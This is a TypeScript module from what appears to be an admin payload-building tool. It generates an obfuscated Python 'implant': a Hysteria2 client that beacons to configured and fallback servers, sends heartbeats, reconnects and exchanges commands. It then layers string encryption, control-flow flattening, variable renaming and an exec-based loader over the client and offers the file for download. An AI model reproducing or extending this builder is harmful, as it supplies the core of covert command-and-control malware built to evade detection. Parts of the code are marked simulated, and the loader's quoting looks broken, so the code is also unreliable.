/* ------------------------------------------------------------------ */
/*  Python Payload Builder Module                                       */
/* ------------------------------------------------------------------ */

import { writeFile } from "fs/promises"
import { tmpdir } from "os"
import { join } from "path"
import { updatePayloadBuildStatus, updatePayloadBuild } from "@/lib/db/payload-builds"
import { encryptStrings, generatePythonDecryptionStub } from "@/lib/payloads/obfuscation/string-encryption"
import { flattenControlFlow } from "@/lib/payloads/obfuscation/control-flow-flattening"
import logger from "@/lib/logger"
import type { PayloadConfig } from "@/lib/payloads/generator"

/* ------------------------------------------------------------------ */
/*  Python Client Template                                             */
/* ------------------------------------------------------------------ */

function generatePythonClient(
  hysteriaConfig: { server: string; auth: string; obfs?: string },
  features: { autoReconnect: boolean; heartbeat: number; fallbackServers: string[] }
): string {
  const { server, auth, obfs } = hysteriaConfig
  const { autoReconnect, heartbeat, fallbackServers } = features

  return `
#!/usr/bin/env python3
"""
Hysteria2 Python Client
Auto-generated payload
"""

import asyncio
import json
import socket
import struct
import time
from typing import Optional, List

class Hysteria2Client:
    """Hysteria2 client implementation"""

    def __init__(
        self,
        server: str,
        auth: str,
        obfs: Optional[str] = None,
        auto_reconnect: bool = True,
        heartbeat: int = 30,
        fallback_servers: List[str] = None
    ):
        self.server = server
        self.auth = auth
        self.obfs = obfs
        self.auto_reconnect = auto_reconnect
        self.heartbeat_interval = heartbeat
        self.fallback_servers = fallback_servers or []
        self.current_server_index = 0
        self.connected = False
        self.heartbeat_task = None

    async def connect(self) -> bool:
        """Connect to Hysteria2 server"""
        servers = [self.server] + self.fallback_servers

        for i, server in enumerate(servers):
            try:
                if ':' in server:
                    host, port = server.rsplit(':', 1)
                    port = int(port)
                else:
                    host = server
                    port = 443

                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(10)
                self.sock.connect((host, port))

                auth_data = json.dumps({"auth": self.auth}).encode()
                self.sock.sendall(struct.pack('!I', len(auth_data)) + auth_data)

                response_len = struct.unpack('!I', self.sock.recv(4))[0]
                response = json.loads(self.sock.recv(response_len).decode())

                if response.get('status') == 'success':
                    self.connected = True
                    self.current_server_index = i
                    return True

            except Exception as e:
                print(f"Connection failed to {server}: {e}")
                if i < len(servers) - 1:
                    continue
                raise

        return False

    async def disconnect(self):
        """Disconnect from server"""
        if self.heartbeat_task:
            self.heartbeat_task.cancel()

        if self.connected:
            try:
                self.sock.close()
            except:
                pass
            self.connected = False

    async def heartbeat_loop(self):
        """Send periodic heartbeats"""
        while self.connected:
            try:
                await asyncio.sleep(self.heartbeat_interval)
                heartbeat_data = json.dumps({"type": "heartbeat"}).encode()
                self.sock.sendall(struct.pack('!I', len(heartbeat_data)) + heartbeat_data)
            except Exception as e:
                print(f"Heartbeat failed: {e}")
                if self.auto_reconnect:
                    await self.reconnect()
                else:
                    break

    async def reconnect(self):
        """Attempt to reconnect to fallback servers"""
        await self.disconnect()

        next_index = (self.current_server_index + 1) % len([self.server] + self.fallback_servers)
        self.current_server_index = next_index

        servers = [self.server] + self.fallback_servers
        if next_index < len(servers):
            self.server = servers[next_index]
            return await self.connect()

        return False

    async def send_command(self, command: dict) -> dict:
        """Send command to server"""
        if not self.connected:
            raise ConnectionError("Not connected to server")

        try:
            command_data = json.dumps(command).encode()
            self.sock.sendall(struct.pack('!I', len(command_data)) + command_data)

            response_len = struct.unpack('!I', self.sock.recv(4))[0]
            response = json.loads(self.sock.recv(response_len).decode())

            return response
        except Exception as e:
            print(f"Command failed: {e}")
            if self.auto_reconnect:
                await self.reconnect()
            raise

async def main():
    """Main entry point"""
    client = Hysteria2Client(
        server="${server}",
        auth="${auth}",
        obfs="${obfs || ''}",
        auto_reconnect=${autoReconnect ? "True" : "False"},
        heartbeat=${heartbeat},
        fallback_servers=${JSON.stringify(fallbackServers)}
    )

    try:
        if await client.connect():
            print("Connected to Hysteria2 server")

            client.heartbeat_task = asyncio.create_task(client.heartbeat_loop())

            while True:
                await asyncio.sleep(1)

    except KeyboardInterrupt:
        print("Shutting down...")
    finally:
        await client.disconnect()

if __name__ == "__main__":
    asyncio.run(main())
`
}

/* ------------------------------------------------------------------ */
/*  PyArmor-style obfuscation (simulated)                              */
/* ------------------------------------------------------------------ */

function applyPyArmorObfuscation(source: string): string {
  // Simulate PyArmor-style obfuscation by wrapping the script
  // in a bootstrap loader that would decrypt at runtime
  const bootstrap = `# PyArmor-style bootstrap (simulated)
import importlib
import types

def _pyarmor_bootstrap():
    """Simulated PyArmor bootstrap loader"""
    # In production, this would:
    # 1. Verify license
    # 2. Decrypt protected code segments
    # 3. Execute in restricted namespace
    _ns = {}
    _code = compile(_protected_code, '<protected>', 'exec')
    exec(_code, _ns)
    return _ns

_protected_code = """
`

  const footer = `
"""

# Execute protected payload
_bootsrap_result = _pyarmor_bootstrap()
`

  return bootstrap + source.trim() + footer
}

/* ------------------------------------------------------------------ */
/*  Build Step Helper                                                  */
/* ------------------------------------------------------------------ */

async function simulateBuildStep(
  id: string,
  delayMs: number,
  message: string
): Promise<void> {
  await updatePayloadBuildStatus(id, "building", message)
  await new Promise((resolve) => setTimeout(resolve, delayMs))
}

/* ------------------------------------------------------------------ */
/*  Public API                                                         */
/* ------------------------------------------------------------------ */

/**
 * Build a Python payload.
 *
 * Generates an async Hysteria2 client wrapper, embeds configuration,
 * adds auto-reconnect logic, and applies PyArmor-style obfuscation.
 *
 * @param id     - Payload build ID
 * @param config - Payload configuration
 */
export async function buildPython(
  id: string,
  config: PayloadConfig
): Promise<void> {
  await updatePayloadBuildStatus(id, "building", "Generating Python payload...")

  try {
    // Step 1: Create async Hysteria2 client wrapper
    await simulateBuildStep(id, 400, "Creating async Hysteria2 client wrapper...")
    let pythonScript = generatePythonClient(config.hysteriaConfig, config.features)

    // Step 2: Embed configuration
    await simulateBuildStep(id, 600, "Embedding configuration...")

    // Step 3: Add auto-reconnect logic (already in template)
    await simulateBuildStep(id, 300, "Adding auto-reconnect logic...")

    // Step 4: Apply obfuscation
    if (config.obfuscation.enabled) {
      if (config.obfuscation.techniques.includes("string_encode")) {
        await simulateBuildStep(id, 500, "Applying string encryption...")
        const decryptionStub = generatePythonDecryptionStub(
          Buffer.from(Math.random().toString(36)).toString("hex").slice(0, 16)
        )
        pythonScript = decryptionStub + "\n" + pythonScript
      }

      if (config.obfuscation.techniques.includes("control_flow")) {
        await simulateBuildStep(id, 600, "Applying control flow obfuscation...")
        pythonScript = flattenControlFlow(pythonScript, config.obfuscation.level)
      }

      // PyArmor-style obfuscation for heavy mode
      if (config.obfuscation.level === "heavy") {
        await simulateBuildStep(id, 800, "Applying Python bytecode obfuscation (PyArmor-style)...")
        pythonScript = applyPyArmorObfuscation(pythonScript)
      } else if (config.obfuscation.level === "medium") {
        await simulateBuildStep(id, 500, "Applying Python variable obfuscation...")
        // Medium: just rename variables
        pythonScript = applyVariableRenaming(pythonScript)
      }
    }

    // Step 5: Write script to disk
    const outPath = join(tmpdir(), `payload-${id}.py`)
    await writeFile(outPath, pythonScript, "utf8")
    const artifactSize = Buffer.byteLength(pythonScript, "utf8")

    await updatePayloadBuild(id, {
      sizeBytes: artifactSize,
      downloadUrl: `/api/admin/security/payloads/${id}/download`,
      implantBinaryPath: outPath,
    })

    logger.info({ id, sizeBytes: artifactSize, outPath }, "Python payload build: completed")
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : String(err)
    logger.error({ id, err: errorMsg }, "Python payload build: failed")
    throw err
  }
}

/* ------------------------------------------------------------------ */
/*  Variable Renaming (Python)                                         */
/* ------------------------------------------------------------------ */

function applyVariableRenaming(source: string): string {
  const variableMap = new Map<string, string>()
  let counter = 0

  // Python variable pattern: self.xxx or standalone xxx
  return source.replace(/\b([a-z_][a-z0-9_]*)\s*=/gi, (match, varName) => {
    // Skip Python keywords and builtins
    const keywords = new Set([
      "self", "import", "from", "class", "def", "return", "if", "else",
      "elif", "for", "while", "try", "except", "finally", "with", "as",
      "print", "True", "False", "None", "async", "await", "pass", "raise",
      "break", "continue", "in", "not", "and", "or", "is", "lambda",
    ])
    if (keywords.has(varName)) return match

    if (!variableMap.has(varName)) {
      const newName = `_v${counter}_${Math.random().toString(36).slice(2, 6)}`
      variableMap.set(varName, newName)
      counter++
    }
    return `${variableMap.get(varName)}=`
  })
}
